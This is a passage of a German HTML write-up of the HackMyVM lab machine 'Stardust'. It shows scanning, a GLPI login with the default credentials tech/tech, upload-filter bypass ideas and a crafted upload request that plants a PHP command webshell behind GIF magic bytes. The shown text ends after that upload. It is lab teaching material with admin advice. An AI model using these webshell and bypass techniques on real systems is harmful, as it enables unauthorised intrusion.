@@ -1,0 +1,1160 @@
+﻿﻿﻿<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Stardust - HackMyVM - Bericht</title>
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="../../horizontale-navbar.css">
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+</head>
+<body class="level-medium"> <!-- Klasse für CSS-Styling des Levels -->
+ 
+    <div class="header-bg level-medium"> <!-- Klasse für CSS-Styling des Levels -->
+        <h1>Stardust - HackMyVM - Level: Medium - Bericht</h1>
+        <div class="level-container">
+            <h2>Medium</h2> <!-- H2 ohne Inline-Style, Farbe via CSS -->
+            <div class="circle">
+                <div class="segment segment-1"></div>
+                <div class="segment segment-2"></div>
+                <div class="segment segment-3"></div>
+                <div class="inner"></div> <!-- Hintergrundfarbe via CSS -->
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                <div class="tool-item">arp-scan</div>
+                <div class="tool-item">vi</div>
+                <div class="tool-item">nmap</div>
+                <div class="tool-item">nikto</div>
+                <div class="tool-item">gobuster</div>
+                <div class="tool-item">wfuzz</div> <!-- Attempted -->
+                <div class="tool-item">curl</div>
+                <div class="tool-item">Burp Suite</div> <!-- Implied for POST modification -->
+                <div class="tool-item">nc (netcat)</div>
+                <div class="tool-item">python3</div> <!-- For reverse shell & http.server -->
+                <div class="tool-item">mysql</div>
+                <div class="tool-item">john</div>
+                <div class="tool-item">su</div>
+                <div class="tool-item">sudo</div> <!-- Attempted -->
+                <div class="tool-item">find</div>
+                <div class="tool-item">ls</div>
+                <div class="tool-item">cat</div>
+                <div class="tool-item">wget</div>
+                <div class="tool-item">pspy64</div>
+                <div class="tool-item">file</div>
+                <div class="tool-item">jq</div> <!-- Used in /opt/meteo -->
+                <div class="tool-item">tar</div> <!-- Used in /opt/meteo -->
+                <div class="tool-item">nano</div> <!-- Implied by config edit -->
+                <div class="tool-item">cp</div>
+                <div class="tool-item">mv</div> <!-- Implied by tar extraction -->
+                <div class="tool-item">cd</div> <!-- Implied -->
+            </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                <li><a href="#reconnaissance">Reconnaissance</a></li>
+                <li><a href="#enumeration">Enumeration (Web, GLPI)</a></li>
+                <li><a href="#initial-access">Initial Access (Webshell Upload via .htaccess Bypass)</a></li>
+                <li><a href="#poc-initial">Proof of Concept (Initial Access - Webshell Upload)</a></li>
+                <li><a href="#privilege-escalation">Privilege Escalation (Cronjob/Tar Exploit)</a></li>
+                <li><a href="#poc-privesc">Proof of Concept (Privilege Escalation - Config Manipulation)</a></li>
+                <li><a href="#flags">Flags</a></li>
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance</h2>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cycat)-[~]
+└─# <span class="command">arp-scan -l</span></div>
+                    <pre>
+<span class="command">192.168.2.111</span>	<span class="command">08:00:27:65:79:a2</span>	PCS Systemtechnik GmbH
+</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Der Befehl `arp-scan -l` wird verwendet, um aktive Hosts im lokalen Netzwerk zu identifizieren. Es wird ein Host mit der IP <span class="command">192.168.2.111</span> und der MAC-Adresse <span class="command">08:00:27:65:79:a2</span> (PCS Systemtechnik GmbH / Oracle VirtualBox) gefunden.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Das Zielsystem "Stardust" wurde erfolgreich im Netzwerk lokalisiert. Die IP <span class="command">192.168.2.111</span> ist die Basis für weitere Scans.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Notieren Sie die Ziel-IP. Führen Sie Port-Scans (z.B. mit `nmap`) durch, um offene Dienste zu ermitteln.<br><strong>Empfehlung (Admin):</strong> Netzwerksegmentierung kann die Sichtbarkeit von Hosts einschränken. ARP-Aktivitäten überwachen.</p>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cycat)-[~]
+└─# <span class="command">vi /etc/hosts</span></div>
+                    <pre>
+[Inhalt /etc/hosts nach Bearbeitung]
+127.0.0.1	localhost
+<span class="command">192.168.2.111   stardust.hmv</span>
+</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Die lokale Hosts-Datei des Angreifer-Systems wird bearbeitet, um den Hostnamen `stardust.hmv` der gefundenen IP-Adresse <span class="command">192.168.2.111</span> zuzuordnen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Standardmäßiger, notwendiger Schritt, um das Zielsystem über seinen Hostnamen ansprechen zu können.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Sicherstellen, dass die Zuordnung korrekt ist.<br><strong>Empfehlung (Admin):</strong> Keine direkte Aktion erforderlich.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">┌──(root㉿cycat)-[~]
+└─# <span class="command">nmap -sS -sC -sV -T5 -A 192.168.2.111 -p-</span></div>
+                    <pre>
+Starting Nmap 7.93 ( https://nmap.org ) at <span class="command">2023-07-21 23:33 CEST</span>
+Nmap scan report for stardust.hmv (192.168.2.111)
+Host is up (0.00021s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+<span class="command">22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)</span>
+| ssh-hostkey:
+|   3072 db:f9:46:e5:20:81:6c:ee:c7:25:08:ab:22:51:36:6c (RSA)
+|   256 33:c0:95:64:29:47:23:dd:86:4e:e6:b8:07:33:67:ad (ECDSA)
+|_  256 be:aa:6d:42:43:dd:7d:d4:0e:0d:74:78:c1:89:a1:36 (ED25519)
+<span class="command">80/tcp open  http    Apache httpd 2.4.56 ((Debian))</span>
+<span class="password">|_http-title: Authentication - GLPI</span> <span class="password"><-- GLPI Installation!</span>
+|_http-server-header: Apache/2.4.56 (Debian)
+MAC Address: 08:00:27:65:79:A2 (Oracle VirtualBox virtual NIC)
+[...]
+OS details: Linux 4.15 - 5.6
+[...]
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.21 ms stardust.hmv (192.168.2.111)
+[...]
+</pre>
+                     <div class="prompt">┌──(root㉿cycat)-[~]
+└─# <span class="command">nmap -sS -sC -sV -T5 -A 192.168.2.111 -p- | grep open</span></div>
+                     <pre>
+22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
+80/tcp open  http    Apache httpd 2.4.56 ((Debian))
+</pre>
+                 </div>
+             </div>
+            <p class="analysis"><strong>Analyse:</strong> Ein umfassender Nmap-Scan (`-p-`, `-sC`, `-sV`, `-A`) identifiziert zwei offene TCP-Ports:
+            <ul>
+                <li>Port <span class="command">22 (SSH)</span>: Läuft OpenSSH 8.4p1 (Debian).</li>
+                <li>Port <span class="command">80 (HTTP)</span>: Läuft Apache 2.4.56 (Debian). Der Seitentitel lautet "Authentication - GLPI", was auf eine installierte GLPI (Gestionnaire Libre de Parc Informatique - ein IT-Asset-Management-Tool) Instanz hindeutet.</li>
+            </ul></p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Hauptangriffsfläche ist die GLPI-Installation auf Port 80. GLPI hat in der Vergangenheit mehrere Schwachstellen aufgewiesen (SQLi, RCE, LFI). SSH ist ein sekundäres Ziel.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Recherchieren Sie die GLPI-Version (falls möglich) und suchen Sie nach bekannten Exploits (`searchsploit glpi`). Führen Sie Web-Enumeration (Directory Busting mit `gobuster`/`ffuf`, Nikto) auf Port 80 durch. Versuchen Sie Standard-GLPI-Zugangsdaten (`glpi/glpi`, `tech/tech`, `normal/normal`, `post-only/postonly`).<br><strong>Empfehlung (Admin):</strong> Halten Sie GLPI, Apache und SSH immer auf dem neuesten Stand. Schützen Sie die GLPI-Installation durch starke Passwörter, Zugriffsbeschränkungen und regelmäßige Sicherheitsüberprüfungen.</p>
+
+        </section>
+
+        <section id="enumeration">
+            <h2>Enumeration (Web, GLPI)</h2>
+
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">┌──(root㉿cycat)-[~]
+└─# <span class="command">nikto -h 192.168.2.111</span></div>
+                    <pre>
+- Nikto v2.5.0
+---------------------------------------------------------------------------
++ Target IP:          192.168.2.111
++ Target Hostname:    192.168.2.111
++ Target Port:        80
++ Start Time:         <span class="command">2023-07-21 23:33:27 (GMT2)</span>
+---------------------------------------------------------------------------
++ Server: Apache/2.4.56 (Debian)
++ /: Cookie <span class="command">glpi_40d1b2d83998fabacb726e5bc3d22129</span> created without the httponly flag. [...]
++ /: The anti-clickjacking X-Frame-Options header is not present. [...]
++ /: The X-Content-Type-Options header is not set. [...]
++ <span class="command">/bin/</span>: Directory indexing found.
++ /: Web Server returns a valid response with junk HTTP methods [...]
++ /: DEBUG HTTP verb may show server debugging information. [...]
++ <span class="command">/inc/config.php</span>: Bookmark4U v1.8.3 include files are not protected [...] <span class="password"><-- Wahrscheinlich False Positive, nicht Bookmark4U</span>
++ <span class="command">/config/</span>: Directory indexing found.
++ /config/: Configuration information may be available remotely.
++ /bin/: This might be interesting.
++ <span class="command">/css/</span>: Directory indexing found.
++ /css/: This might be interesting.
++ <span class="command">/files/</span>: Directory indexing found.
++ /files/: This might be interesting.
++ <span class="command">/install/</span>: This might be interesting. <span class="password"><-- Installationsverzeichnis!</span>
++ /lib/: This might be interesting.
++ <span class="command">/pics/</span>: Directory indexing found.
++ /pics/: This might be interesting.
++ /public/: This might be interesting.
++ <span class="command">/src/</span>: Directory indexing found.
++ <span class="command">/README.md</span>: Readme Found.
++ 8910 requests: 0 error(s) and 21 item(s) reported on remote host
++ End Time:           <span class="command">2023-07-21 23:34:09 (GMT2)</span> (42 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested
+</pre>
+                </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Ein `nikto`-Scan auf Port 80 liefert viele Ergebnisse, die typisch für eine GLPI-Installation sind:
+            <ul>
+                <li>Fehlende Security Header und ein Cookie ohne HttpOnly-Flag.</li>
+                <li>Directory Indexing für zahlreiche Verzeichnisse (`/bin/`, `/config/`, `/css/`, `/files/`, `/pics/`, `/src/`). Dies erlaubt das Auflisten der Verzeichnisinhalte.</li>
+                <li>Das potenziell kritische Verzeichnis `<span class="command">/install/</span>` wird gefunden. Installationsverzeichnisse sollten nach der Installation entfernt werden, da sie oft Konfigurationslecks oder Reset-Möglichkeiten bieten.</li>
+                <li>Ein `/README.md` wird gefunden.</li>
+                <li>Ein Hinweis auf `/inc/config.php` und eine alte Bookmark4U-Schwachstelle (wahrscheinlich ein False Positive, aber die Existenz der Datei ist interessant).</li>
+            </ul></p>
+            <p class="evaluation"><strong>Bewertung:</strong> Nikto bestätigt die GLPI-Installation und deckt mehrere Informationslecks und potenziell gefährliche Verzeichnisse auf. Das `/install/`-Verzeichnis und das `/config/`-Verzeichnis (mit Directory Indexing) sind die wichtigsten Funde.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Untersuchen Sie dringend die Verzeichnisse `/install/` und `/config/`. Suchen Sie in `/config/` nach Datenbank-Zugangsdaten (oft `config_db.php`). Prüfen Sie `/install/`, ob eine Neuinstallation oder ein Reset ausgelöst werden kann. Laden Sie die `/README.md` herunter. Analysieren Sie die anderen Verzeichnisse mit Directory Indexing auf interessante Dateien.<br><strong>Empfehlung (Admin):</strong> Entfernen Sie das `/install/`-Verzeichnis nach der GLPI-Installation. Deaktivieren Sie Directory Indexing für alle Verzeichnisse (`Options -Indexes` in Apache). Sichern Sie das `/config/`-Verzeichnis besonders ab (z.B. Zugriff über `.htaccess` beschränken). Implementieren Sie die fehlenden Security Header.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">┌──(root㉿cycat)-[~]
+└─# <span class="command">gobuster dir -u http://stardust.hmv -x [...],php,html,[...] -w "/usr/share/seclists/[...]/directory-list-2.3-medium.txt" -b '403,404' -e --no-error</span></div>
+                     <pre>
+[...]
+<span class="command">http://stardust.hmv/index.php</span>            (Status: 200) [Size: 9137]
+<span class="command">http://stardust.hmv/templates</span>            (Status: 301) [Size: 316] [--> http://stardust.hmv/templates/]
+<span class="command">http://stardust.hmv/resources</span>            (Status: 301) [Size: 316] [--> http://stardust.hmv/resources/]
+<span class="command">http://stardust.hmv/files</span>                (Status: 301) [Size: 312] [--> http://stardust.hmv/files/]
+<span class="command">http://stardust.hmv/pics</span>                 (Status: 301) [Size: 311] [--> http://stardust.hmv/pics/]
+<span class="command">http://stardust.hmv/public</span>               (Status: 301) [Size: 313] [--> http://stardust.hmv/public/]
+<span class="command">http://stardust.hmv/version</span>              (Status: 301) [Size: 314] [--> http://stardust.hmv/version/] <span class="password"><-- Version Info?</span>
+<span class="command">http://stardust.hmv/bin</span>                  (Status: 301) [Size: 310] [--> http://stardust.hmv/bin/]
+<span class="command">http://stardust.hmv/plugins</span>              (Status: 301) [Size: 314] [--> http://stardust.hmv/plugins/]
+<span class="command">http://stardust.hmv/css</span>                  (Status: 301) [Size: 310] [--> http://stardust.hmv/css/]
+<span class="command">http://stardust.hmv/ajax</span>                 (Status: 301) [Size: 311] [--> http://stardust.hmv/ajax/]
+<span class="command">http://stardust.hmv/install</span>              (Status: 301) [Size: 314] [--> http://stardust.hmv/install/]
+<span class="command">http://stardust.hmv/lib</span>                  (Status: 301) [Size: 310] [--> http://stardust.hmv/lib/]
+<span class="command">http://stardust.hmv/src</span>                  (Status: 301) [Size: 310] [--> http://stardust.hmv/src/]
+<span class="command">http://stardust.hmv/status.php</span>           (Status: 200) [Size: 115] <span class="password"><-- Status Seite?</span>
+<span class="command">http://stardust.hmv/front</span>                (Status: 301) [Size: 312] [--> http://stardust.hmv/front/]
+<span class="command">http://stardust.hmv/js</span>                   (Status: 301) [Size: 309] [--> http://stardust.hmv/js/]
+<span class="command">http://stardust.hmv/marketplace</span>          (Status: 301) [Size: 318] [--> http://stardust.hmv/marketplace/]
+<span class="command">http://stardust.hmv/vendor</span>               (Status: 301) [Size: 313] [--> http://stardust.hmv/vendor/]
+<span class="command">http://stardust.hmv/config</span>               (Status: 301) [Size: 313] [--> http://stardust.hmv/config/]
+<span class="command">http://stardust.hmv/inc</span>                  (Status: 301) [Size: 310] [--> http://stardust.hmv/inc/]
+<span class="command">http://stardust.hmv/sound</span>                (Status: 301) [Size: 312] [--> http://stardust.hmv/sound/]
+<span class="command">http://stardust.hmv/LICENSE</span>              (Status: 200) [Size: 35148]
+[...]
+</pre>
+                 </div>
+             </div>
+            <p class="analysis"><strong>Analyse:</strong> Ein `gobuster dir`-Scan auf Port 80 bestätigt viele der von Nikto gefundenen Verzeichnisse, die zur Standardstruktur von GLPI gehören (`templates`, `files`, `pics`, `public`, `bin`, `plugins`, `css`, `ajax`, `install`, `lib`, `src`, `front`, `js`, `marketplace`, `vendor`, `config`, `inc`, `sound`). Zusätzlich werden `status.php` und `LICENSE` gefunden.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Bestätigt die GLPI-Struktur. Die `status.php`, `/config/` und `/install/` Verzeichnisse sind die vielversprechendsten Ziele für weitere Enumeration.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Untersuchen Sie `status.php`. Prüfen Sie `/config/` auf lesbare Konfigurationsdateien (insbesondere `config_db.php`). Prüfen Sie `/install/` auf Reste der Installationsroutine.<br><strong>Empfehlung (Admin):</strong> Zugriff auf `/config` und `/install` einschränken oder letzteres entfernen. `status.php` auf Informationslecks prüfen.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt"># <span class="command">Manuelle Prüfung verschiedener Pfade und Logs (impliziert)</span></div>
+                    <pre>
+Versuch SQLi auf Login-Seite (http://stardust.hmv/front/login.php):
+Payload: <span class="command">' OR 1=1 -- -</span>
+Antwort: <span class="password">Error Incorrect username or password</span> <span class="password"><-- SQLi wahrscheinlich nicht erfolgreich</span>
+
+Zugriff auf Templates (Beispiel):
+http://stardust.hmv/templates/%7B%7B%20path('front/tracking.injector.php')%20%7D%7D <span class="password"><-- Sieht nach Template-Syntax aus (Twig?)</span>
+http://stardust.hmv/templates/{{ path('front/tracking.injector.php') }} <span class="password"><-- Sieht nach SSTI-Versuch aus?</span>
+<span class="password"># Ergebnis dieser Versuche unklar / nicht im Log</span>
+
+Log-Datei Fund (Quelle unklar, evtl. LFI oder anderer Leak):
+<span class="command">/home/cycat/Downloads/php-errors.log</span> <span class="password"><-- Lokaler Pfad des Angreifers!</span>
+[2023-05-04 20:55:32] glpiphplog.CRITICAL:   * Uncaught Exception Error: <span class="password">Class '' not found in /var/www/html/src/ITILSolution.php at line 104</span>
+[...]
+
+Log-Datei Fund (Quelle unklar):
+<span class="command">/home/cycat/Downloads/access-errors.log</span> <span class="password"><-- Lokaler Pfad des Angreifers!</span>
+2023-07-21 23:33:51 [@stardust.hmv]
+<span class="password">CSRF check failed for User ID:  at /</span> <span class="password"><-- CSRF-Schutz scheint aktiv</span>
+
+Zugriff auf status.php:
+http://192.168.2.111/status.php
+<span class="command">GLPI_DB_OK</span>
+<span class="command">GLPI_SESSION_DIR_OK</span>
+No LDAP server
+No IMAP server
+No CAS server
+No mail collector
+<span class="command">Crontasks_OK</span>
+<span class="command">GLPI_OK</span>
+
+Zugriff auf Konfigurationsdatei (erfolglos):
+http://stardust.hmv/inc/config.php
+<span class="password">Sorry. You can't access this file directly</span>
+curl http://stardust.hmv/inc/config.php -sI
+HTTP/1.1 200 OK <span class="password"><-- Datei existiert, direkter Zugriff blockiert</span>
+
+Weitere gefundene Dateien im /inc Verzeichnis:
+http://stardust.hmv/inc/index.php            (Status: 200) [Size: 0]
+http://stardust.hmv/inc/includes.php         (Status: 200) [Size: 0]
+http://stardust.hmv/inc/config.php           (Status: 200) [Size: 42] <span class="password"><-- Widerspruch? Größe 42, aber Zugriff blockiert?</span>
+http://stardust.hmv/inc/define.php           (Status: 500) [Size: 0] <span class="password"><-- Serverfehler</span>
+</pre>
+                </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Mehrere Enumerationsschritte werden durchgeführt oder beschrieben:
+            <ul>
+                <li>Ein einfacher SQL-Injection-Versuch auf der Login-Seite scheitert.</li>
+                <li>Es wird mit Template-Syntax experimentiert (möglicherweise Suche nach Server-Side Template Injection - SSTI), das Ergebnis ist unklar.</li>
+                <li>Log-Dateien (`php-errors.log`, `access-errors.log`) werden erwähnt, befinden sich aber auf dem lokalen Angreifer-System. Ihr Ursprung ist unklar (vielleicht aus einem früheren Test oder einer anderen Quelle). Sie zeigen interne Pfade (`/var/www/html/src/...`) und fehlgeschlagene CSRF-Checks.</li>
+                <li>`status.php` zeigt den allgemeinen Systemstatus und bestätigt eine funktionierende Datenbankverbindung und Cronjobs.</li>
+                <li>Der direkte Zugriff auf `/inc/config.php` wird blockiert, obwohl Gobuster sie mit Größe 42 findet. Dies deutet auf eine Schutzmaßnahme innerhalb der PHP-Datei hin.</li>
+                <li>`/inc/define.php` verursacht einen Serverfehler (500), was auf einen Programmierfehler oder eine fehlende Abhängigkeit hindeuten könnte.</li>
+            </ul></p>
+             <p class="evaluation"><strong>Bewertung:</strong> Die Anwendung scheint gegen einfache SQLi geschützt zu sein. Die Log-Dateien liefern interne Pfade, sind aber ohne Kontext schwer zu nutzen. `status.php` ist informativ, aber kein direkter Exploit. Der blockierte Zugriff auf `config.php` ist normal. Der 500er-Fehler bei `define.php` könnte weiter untersucht werden. Die Template-Syntax-Versuche deuten auf die Suche nach SSTI hin, was bei komplexen Webanwendungen ein möglicher Vektor ist.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Versuchen Sie, Standard-Logins für GLPI (`glpi/glpi`, `tech/tech` etc.). Untersuchen Sie das `/ajax/`-Verzeichnis (z.B. `getFileTag.php`, wie im nächsten Schritt angedeutet) auf Schwachstellen. Prüfen Sie bekannte GLPI-Exploits gegen die (noch unbekannte) Version.<br><strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass keine Log-Dateien oder internen Fehlerdetails nach außen dringen. Schützen Sie Konfigurationsdateien. Beheben Sie den 500er-Fehler in `define.php`. Halten Sie GLPI aktuell.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt"># <span class="command">Hinweis auf ajax/getFileTag.php</span></div>
+                     <pre>http://stardust.hmv/ajax/getFileTag.php</pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Es wird auf die Datei `/ajax/getFileTag.php` hingewiesen. AJAX-Endpunkte sind oft anfällig für verschiedene Schwachstellen, da sie direkt aufgerufen werden können und manchmal weniger strenge Prüfungen haben.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Diese Datei sollte gezielt untersucht werden.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Rufen Sie die URL auf. Analysieren Sie die erwarteten Parameter (ggf. im JavaScript-Code der Hauptanwendung suchen). Testen Sie auf SQLi, LFI, RCE etc.<br><strong>Empfehlung (Admin):</strong> Sichern Sie alle AJAX-Endpunkte genauso sorgfältig ab wie andere Teile der Anwendung.</p>
+
+             <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt"># <span class="command">Recherche nach Standard-GLPI-Logins</span></div>
+                     <pre>
+Googlesuche nach Standard Login:
+[...]
+you have 4 differents profils
+
+<span class="command">glpi/glpi</span> (super-admin)
+<span class="command">tech/tech</span>
+<span class="command">postonly/postonly</span> (only for helpdesk)
+<span class="command">normal/normal</span>
+</pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Es wird nach Standard-Zugangsdaten für GLPI gesucht. Die üblichen Paare werden gefunden: `glpi/glpi`, `tech/tech`, `normal/normal`, `postonly/postonly`.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Standard-Enumerationsschritt.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Testen Sie diese Standard-Logins auf der Seite `http://stardust.hmv/front/login.php` (oder `/index.php`).<br><strong>Empfehlung (Admin):</strong> Ändern Sie *alle* Standardpasswörter sofort nach der Installation.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt"># <span class="command">Login-Versuch mit tech:tech (impliziert)</span></div>
+                     <pre>http://stardust.hmv/front/central.php <span class="password"><-- Erfolgreicher Login als tech</span></pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Der Login mit den Standard-Zugangsdaten `<span class="command">tech</span>`:`<span class="password">tech</span>` war erfolgreich, da der Zugriff auf `central.php` (die Hauptseite nach dem Login) möglich ist.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Kritische Schwachstelle! Ein Standardpasswort wurde nicht geändert. Dies gewährt Zugriff auf die Anwendung als technischer Benutzer.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Enumerieren Sie die Funktionen, die als `tech`-Benutzer verfügbar sind. Suchen Sie nach Möglichkeiten, Dateien hochzuladen, Code auszuführen, Konfigurationen einzusehen oder die Rechte weiter zu eskalieren.<br><strong>Empfehlung (Admin):</strong> Ändern Sie das `tech`-Standardpasswort und alle anderen Standardpasswörter sofort.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt"># <span class="command">Untersuchung nach Login</span></div>
+                     <pre>
+LFI-Versuche über document.send.php (scheitern):
+http://stardust.hmv/front/document.send.php?file=/etc/passwd
+http://stardust.hmv/front/document.send.php?file=/var/log/access.log
+Antwort: <span class="password">Unerlaubter Zugriff auf diese Datei</span>
+
+Hinweis in Ticket gefunden (Seite: ticket.form.php?id=6):
+Solution: We are currently experiencing technical problems with intranet.
+We have set up a backup server accessible without VPN: <span class="command">intranetik.stardust.hmv</span>
+</pre>
+                 </div>
+             </div>
+            <p class="analysis"><strong>Analyse:</strong> Nach dem Login als `tech` werden weitere Tests durchgeführt:
+            <ul>
+                <li>Versuche, eine LFI-Schwachstelle in `document.send.php` auszunutzen, scheitern mit einer Zugriffsfehlermeldung.</li>
+                <li>Bei der Untersuchung von Tickets (hier Ticket mit ID 6) wird ein Hinweis auf einen weiteren, internen Hostnamen gefunden: `<span class="command">intranetik.stardust.hmv</span>`.</li>
+            </ul></p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die LFI-Versuche waren erfolglos. Der Hinweis auf `intranetik.stardust.hmv` ist jedoch ein sehr wichtiger Fund und deutet auf einen weiteren VHost oder ein separates System hin.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Fügen Sie `<span class="command">intranetik.stardust.hmv</span>` zur `/etc/hosts`-Datei hinzu (auf die IP <span class="command">192.168.2.111</span>). Rufen Sie diesen neuen Hostnamen im Browser auf und beginnen Sie mit dessen Enumeration.<br><strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass interne Hostnamen nicht in öffentlich zugänglichen Tickets oder Kommentaren preisgegeben werden. Sichern Sie interne Systeme angemessen ab.</p>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt"># <span class="command">Analyse von intranetik.stardust.hmv (impliziert)</span></div>
+                    <pre>
+Aufruf von http://intranetik.stardust.hmv/index.php:
+<span class="command">Stardust File Upload</span>
+Use this page to upload files to the company's shared server.
+Note that file types such as .php, .py, .sh, .asp, etc., are not allowed.
+[...]
+
+Test-Upload (shell.php.jpg):
+Versuchter Zugriff auf http://intranetik.stardust.hmv/shell.php.jpg:
+Fehler: <span class="password">Die Grafik [...] kann nicht angezeigt werden, weil sie Fehler enthält</span> <span class="password"><-- Datei existiert, wird aber nicht als Bild interpretiert</span>
+</pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Der neue VHost `intranetik.stardust.hmv` wird untersucht. Er enthält eine einfache Dateiupload-Seite. Ein Hinweis besagt, dass bestimmte Dateitypen (`.php`, `.py`, `.sh` etc.) nicht erlaubt sind. Ein Test-Upload einer Datei namens `shell.php.jpg` scheint erfolgreich zu sein (keine Fehlermeldung beim Upload), aber der direkte Zugriff auf die Datei im Browser führt zu einem Fehler, der darauf hindeutet, dass der Server sie nicht als Bild erkennt (weil sie wahrscheinlich PHP-Code enthält).</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Es gibt eine Upload-Funktion mit einer Blacklist für gefährliche Dateiendungen. Diese Blacklist ist jedoch oft unvollständig oder kann umgangen werden (z.B. durch doppelte Endungen wie `.php.jpg`, alternative PHP-Endungen wie `.phtml`, Groß-/Kleinschreibung, oder durch Manipulation des Content-Types). Die Tatsache, dass die `.php.jpg`-Datei zwar hochgeladen, aber nicht korrekt angezeigt wird, deutet darauf hin, dass der Upload an sich funktioniert, aber die Ausführung als PHP noch verhindert wird.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Versuchen Sie verschiedene Bypass-Techniken für den Upload-Filter:
+            1.  Groß-/Kleinschreibung: `shell.PhP`
+            2.  Alternative Endungen: `shell.phtml`, `shell.php5`, etc.
+            3.  Doppelte Endungen (wie bereits versucht, aber ggf. mit anderer Reihenfolge).
+            4.  Manipulation des Content-Types im Upload-Request (mit Burp Suite).
+            5.  Versuchen Sie, eine `.htaccess`-Datei hochzuladen, um dem Server beizubringen, harmlose Endungen (z.B. `.ben`) als PHP auszuführen.<br>
+            <strong>Empfehlung (Admin):</strong> Implementieren Sie eine Whitelist für erlaubte Dateiendungen beim Upload statt einer Blacklist. Validieren Sie den tatsächlichen MIME-Typ serverseitig. Speichern Sie Uploads außerhalb des Web-Roots oder ohne Ausführungsrechte. Erlauben Sie nicht das Hochladen von Konfigurationsdateien wie `.htaccess`.</p>
+
+        </section>
+
+        <section id="initial-access">
+            <h2>Initial Access (Webshell Upload via .htaccess Bypass)</h2>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt"># <span class="command">Upload-Versuch 1: PHP in .php.jpg (modifizierter Content-Type)</span></div>
+                    <pre>
+POST /index.php HTTP/1.1
+Host: intranetik.stardust.hmv
+[...]
+Content-Type: multipart/form-data; boundary=---------------------------19823407031929607804901358391
+[...]
+
+-----------------------------19823407031929607804901358391
+Content-Disposition: form-data; name="file"; filename="<span class="command">shell.php .jpg</span>" <span class="password"><-- Leerzeichen vor .jpg?</span>
+Content-Type: application/x-php <span class="password"><-- Content-Type geändert</span>
+
+<span class="command">GIF89a;</span>
+<span class="command">php system($GET['cmd']);</span> <span class="password"><-- Magic Bytes + PHP Payload</span>
+-----------------------------19823407031929607804901358391--
+
+<span class="password">HTTP/1.1 200 OK</span>
+[...]
+File uploaded successfully.
+</pre>
+                 </div>
+             </div>
+            <p class="analysis"><strong>Analyse:</strong> Ein Upload-Versuch wird mit Burp Suite modifiziert:
+            <ul>
+                <li>Dateiname: `shell.php .jpg` (mit einem Leerzeichen vor `.jpg`).</li>
+                <li>Content-Type: `application/x-php` (anstelle von `image/jpeg` oder `image/gif`).</li>
+                <li>Dateiinhalt: Beginnt mit GIF Magic Bytes (`GIF89a;`), gefolgt von einem PHP-Payload (`system($GET['cmd']);`).</li>
+            </ul>
+            Der Upload ist laut Serverantwort erfolgreich.</p>
